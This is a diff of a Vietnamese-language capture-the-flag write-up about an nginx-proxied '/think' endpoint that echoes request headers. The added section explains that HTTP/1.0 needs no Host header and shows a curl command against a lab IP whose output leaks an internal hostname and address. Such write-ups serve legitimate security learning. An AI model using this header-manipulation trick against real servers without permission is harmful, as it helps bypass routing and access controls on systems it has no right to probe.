@@ -46,7 +46,6 @@ server {
         }
 }
 ```
-### Solve
 - Endpoint `/think` trả về request header
 ```
 router.get("/think", async (req, res) => {
@@ -80,4 +79,10 @@ curl -H "Host:" http://94.237.48.147:49291/think
 <hr><center>nginx</center>
 </body>
 </html>
+```
+### Giao thức HTTP 1.0
+- Giao thức HTTP 1.0 không yêu cầu header "Host" trong request header
+```
+curl -H "Host:" --http1.0 http://94.237.48.147:49291/think
+{"host":"alley.firstalleyontheleft.com","x-real-ip":"10.30.18.144","x-forwarded-for":"10.30.18.144","x-forwarded-proto":"http","connection":"close","user-agent":"curl/8.5.0","accept":"*/*"}(base)
 ```
